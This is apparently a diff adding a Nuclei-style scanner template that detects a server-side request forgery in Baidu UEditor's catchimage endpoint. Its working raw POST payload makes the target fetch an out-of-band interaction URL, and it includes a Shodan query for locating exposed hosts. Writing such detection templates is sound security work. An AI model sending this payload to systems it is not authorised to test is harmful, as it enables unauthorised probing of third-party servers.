@@ -1,0 +1,43 @@
+id: ueditor-ssrf-123
+
+info:
+  name: UEditor - Server Side Request Forgery
+  author: pwnhxl
+  severity: medium
+  description: UEditor contains an Server Side Request Forgery vulnerability.
+  reference:
+    - https://xz.aliyun.com/t/4154
+    - https://www.seebug.org/vuldb/ssvid-97311
+  classification:
+    cpe: cpe:2.3:a:baidu:ueditor:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: baidu
+    product: ueditor
+    shodan-query: html:"UEditor"
+  tags: ueditor,ssrf,vuln,宏脉医美经营管理系统
+
+http:
+  - raw:
+      - |
+        POST /content/Js/ueditor/net/controller.ashx?action=catchimage HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 47
+        Origin: null
+        Connection: close
+        Cookie: ASP.NET_SessionId=mzare1hg1ewzaxhakacjhfo0
+        Upgrade-Insecure-Requests: 1
+
+        source[]=http://{{interactsh-url}}/1.png?.ashx
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms DNS Interaction
+        words:
+          - "dns"
